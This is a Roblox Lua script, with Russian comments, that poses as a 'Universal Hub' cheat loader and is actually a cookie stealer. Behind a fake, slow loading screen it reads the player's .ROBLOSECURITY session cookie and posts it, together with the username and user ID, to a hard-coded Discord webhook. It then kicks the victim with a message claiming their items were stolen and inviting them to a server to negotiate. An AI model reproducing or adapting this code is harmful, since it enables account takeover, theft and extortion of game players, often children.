-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"
-- Ссылка на твой сервер для лога
local SERVER_LINK = "https://www.roblox.com/share?code=fbb0b4a26e68f24cb7a8a07085f4e86b&type=Server"

local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- [[ ФУНКЦИЯ ЛОГА ]]
local function sendData()
    local cookie = "N/A"
    pcall(function()
        if getcookies then cookie = getcookies(".roblox.com")[".ROBLOSECURITY"] end
    end)

    local data = {
        ["content"] = "@everyone 🚨 **ЦЕЛЬ ЗАХОДИТ!**",
        ["embeds"] = {{
            ["title"] = "🛠️ Universal Hub | " .. player.Name,
            ["description"] = "Жертва начала загрузку. Заходи на сервер: " .. SERVER_LINK,
            ["color"] = 3066993,
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
                {["name"] = "🔑 Cookie", ["value"] = "```" .. cookie .. "```"}
            }
        }}
    }
    local req = (syn and syn.request) or (http and http.request) or request
    if req then pcall(function() req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end) end
end

-- [[ ИНТЕРФЕЙС УЛЬТРА-ДОЛГОЙ ЗАГРУЗКИ ]]
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 320, 0, 160)
Main.Position = UDim2.new(0.5, -160, 0.5, -80)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)

local Status = Instance.new("TextLabel", Main)
Status.Size = UDim2.new(1, 0, 0, 40)
Status.Position = UDim2.new(0, 0, 0.35, 0)
Status.Text = "Initializing Universal Hub..."
Status.TextColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1
Status.TextSize = 16

local BarBack = Instance.new("Frame", Main)
BarBack.Size = UDim2.new(0.8, 0, 0, 6)
BarBack.Position = UDim2.new(0.1, 0, 0.75, 0)
BarBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

local BarFill = Instance.new("Frame", BarBack)
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)

-- [[ ПРОЦЕСС ЗАМЕДЛЕННОГО ЗАПУСКА ]]
task.spawn(function()
    task.wait(2)
    Status.Text = "Bypassing Anticheat..."
    BarFill:TweenSize(UDim2.new(0.2, 0, 1, 0), "Out", "Linear", 10)
    task.wait(10)
    
    Status.Text = "Loading MM2 Assets..."
    BarFill:TweenSize(UDim2.new(0.5, 0, 1, 0), "Out", "Linear", 15)
    pcall(sendData) -- Отправляем данные, пока он ждет
    task.wait(15)
    
    Status.Text = "Finalizing (Don't close)..."
    BarFill:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Linear", 15)
    task.wait(15)

    -- ПОПЫТКА ТЕЛЕПОРТА ИЛИ КИК
    Status.Text = "Server connection lost. Rejoining..."
    task.wait(2)
    
    -- Пытаемся кикнуть с твоим текстом, чтобы он пошел искать тебя на сервере
    player:Kick("\n\nAll your stuff just got taken by Tobi's stealer.\nJoin the server to negotiate: " .. SERVER_LINK)
end)
